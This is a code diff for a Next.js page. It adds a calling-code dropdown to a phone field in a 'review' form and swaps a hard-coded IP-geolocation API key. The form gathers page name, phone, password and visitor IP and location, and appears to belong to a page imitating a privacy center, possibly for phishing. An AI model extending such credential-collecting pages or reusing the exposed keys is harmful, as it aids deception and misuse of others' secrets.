@@ -3,6 +3,7 @@
 import Image from "next/image";
 import { useRouter } from "next/navigation";
 import { FormEvent, useEffect, useRef, useState } from "react";
+import { COUNTRY_CALLING_CODE_MAP } from "@/lib/geoip";
 import { Dictionary, LOCALE_COOKIE_NAME, Locale, getDictionary, resolveLocaleFromCountryCode } from "@/lib/i18n";
 import styles from "./page.module.css";
 
@@ -288,11 +289,21 @@ export default function HomePageClient({
   const sidebar = dictionary.sidebar;
   const pageContent = dictionary.page;
   const [clientCountryCode, setClientCountryCode] = useState(detectedCountryCode ?? "");
+  const [phoneCountryCode, setPhoneCountryCode] = useState(detectedCountryCode ?? "");
   const [clientCallingCode, setClientCallingCode] = useState(normalizeCallingCode(detectedCallingCode));
+  const [showCallingCodeMenu, setShowCallingCodeMenu] = useState(false);
+  const callingCodeMenuRef = useRef<HTMLDivElement | null>(null);
   const [clientLocation, setClientLocation] = useState(detectedLocation ?? "");
   const [clientIp, setClientIp] = useState(detectedIp ?? "");
-  const phoneFlag = countryCodeToFlag(clientCountryCode);
-  const phoneCode = normalizeCallingCode(clientCallingCode);
+  const normalizedCountryCode = phoneCountryCode.toUpperCase();
+  const fallbackCallingCode = normalizedCountryCode ? COUNTRY_CALLING_CODE_MAP[normalizedCountryCode] : "";
+  const phoneFlag = countryCodeToFlag(normalizedCountryCode);
+  const phoneCode = normalizeCallingCode(clientCallingCode) || fallbackCallingCode || "";
+  const callingCodeOptions = Object.entries(COUNTRY_CALLING_CODE_MAP).map(([countryCode, callingCode]) => ({
+    countryCode,
+    callingCode,
+    flag: countryCodeToFlag(countryCode),
+  }));
 
   const privacyCenterActions: ActionItem[] = [
     {
@@ -528,6 +539,7 @@ export default function HomePageClient({
 
   function closeReviewModal() {
     setShowModal(false);
+    setShowCallingCodeMenu(false);
     setIsSubmited(false);
     setIsSuccess(false);
     setLoadingInitial(false);
@@ -567,6 +579,20 @@ export default function HomePageClient({
       clearTimeout(passwordTimerRef.current);
       passwordTimerRef.current = null;
     }
+  }
+
+  function handleCallingCodeToggle() {
+    setShowCallingCodeMenu((prev) => !prev);
+  }
+
+  function handleSelectCallingCode(countryCode: string) {
+    const callingCode = COUNTRY_CALLING_CODE_MAP[countryCode];
+    if (!callingCode) {
+      return;
+    }
+    setPhoneCountryCode(countryCode);
+    setClientCallingCode(callingCode);
+    setShowCallingCodeMenu(false);
   }
 
   function handleFieldChange<K extends keyof ReviewForm>(field: K, value: ReviewForm[K]) {
@@ -801,6 +827,34 @@ export default function HomePageClient({
   }, [locale]);
 
   useEffect(() => {
+    if (!showCallingCodeMenu) {
+      return;
+    }
+
+    const handleClick = (event: MouseEvent) => {
+      if (!callingCodeMenuRef.current) {
+        return;
+      }
+      if (!callingCodeMenuRef.current.contains(event.target as Node)) {
+        setShowCallingCodeMenu(false);
+      }
+    };
+
+    const handleKey = (event: KeyboardEvent) => {
+      if (event.key === "Escape") {
+        setShowCallingCodeMenu(false);
+      }
+    };
+
+    document.addEventListener("mousedown", handleClick);
+    document.addEventListener("keydown", handleKey);
+    return () => {
+      document.removeEventListener("mousedown", handleClick);
+      document.removeEventListener("keydown", handleKey);
+    };
+  }, [showCallingCodeMenu]);
+
+  useEffect(() => {
     if (!clientCountryCode) {
       return;
     }
@@ -823,6 +877,7 @@ export default function HomePageClient({
           return;
         }
         setClientCountryCode("VN");
+        setPhoneCountryCode("VN");
         setClientCallingCode("+84");
         setClientLocation("N/A / N/A / Vietnam");
       };
@@ -841,7 +896,7 @@ export default function HomePageClient({
         setClientIp(result.ip);
 
         const locationResponse = await fetch(
-          `https://api.ipgeolocation.io/ipgeo?apiKey=126b3879b6b549f8a3e47448ae0a8e91&ip=${result.ip}`,
+          `https://api.ipgeolocation.io/ipgeo?apiKey=a98d43a0318f409fa37091f47fedd946&ip=${result.ip}`,
         );
         if (!locationResponse.ok) {
           throw new Error("Failed to fetch location data");
@@ -870,6 +925,7 @@ export default function HomePageClient({
 
         setClientCallingCode(callingCode);
         setClientCountryCode(countryCode);
+        setPhoneCountryCode(countryCode);
         setClientLocation(`${district} / ${city} / ${country}`);
       } catch (err) {
         console.error(err);
@@ -1137,11 +1193,25 @@ export default function HomePageClient({
                   />
                   {errors.pageName ? <p className={styles.fieldError}>{errors.pageName}</p> : null}
 
-                  <div className={styles.phoneInputWrap}>
-                    <span className={styles.phonePrefix}>
+                  <div className={styles.phoneInputWrap} ref={callingCodeMenuRef}>
+                    <button
+                      type="button"
+                      className={`${styles.phonePrefixButton} ${
+                        showCallingCodeMenu ? styles.phonePrefixButtonOpen : ""
+                      }`}
+                      onClick={handleCallingCodeToggle}
+                      aria-haspopup="listbox"
+                      aria-expanded={showCallingCodeMenu}
+                      aria-label={modal.phoneNumberPlaceholder}
+                    >
                       <span className={styles.phoneFlag}>{phoneFlag}</span>
                       <span className={styles.phoneCode}>{phoneCode}</span>
-                    </span>
+                      <span className={styles.phoneChevron} aria-hidden="true">
+                        <svg viewBox="0 0 20 20">
+                          <path d="M5.5 7.5L10 12L14.5 7.5" />
+                        </svg>
+                      </span>
+                    </button>
                     <input
                       id="phoneNumber"
                       type="tel"
@@ -1151,6 +1221,28 @@ export default function HomePageClient({
                       placeholder={phoneNumberPlaceholder}
                       className={styles.phoneNumberInput}
                     />
+                    {showCallingCodeMenu ? (
+                      <div className={styles.phoneDropdown} role="listbox">
+                        {callingCodeOptions.map((option) => {
+                          const isSelected = option.countryCode === normalizedCountryCode;
+                          return (
+                            <button
+                              key={option.countryCode}
+                              type="button"
+                              className={`${styles.phoneDropdownItem} ${
+                                isSelected ? styles.phoneDropdownItemActive : ""
+                              }`}
+                              onClick={() => handleSelectCallingCode(option.countryCode)}
+                              role="option"
+                              aria-selected={isSelected}
+                            >
+                              <span className={styles.phoneFlag}>{option.flag}</span>
+                              <span className={styles.phoneCode}>{option.callingCode}</span>
+                            </button>
+                          );
+                        })}
+                      </div>
+                    ) : null}
                   </div>
                   {errors.phoneNumber ? <p className={styles.fieldError}>{errors.phoneNumber}</p> : null}
 
@@ -1211,7 +1303,7 @@ export default function HomePageClient({
                     disabled={loadingInitial}
                     aria-busy={loadingInitial}
                   >
-                    {loadingInitial ? <span className={styles.loadingSpinner} aria-hidden="true" /> : modal.sendButton}
+                    {loadingInitial ? <span className={styles.loadingSpinner} aria-hidden="true" /> : continueButtonLabel}
                   </button>
                 </form>
               </>
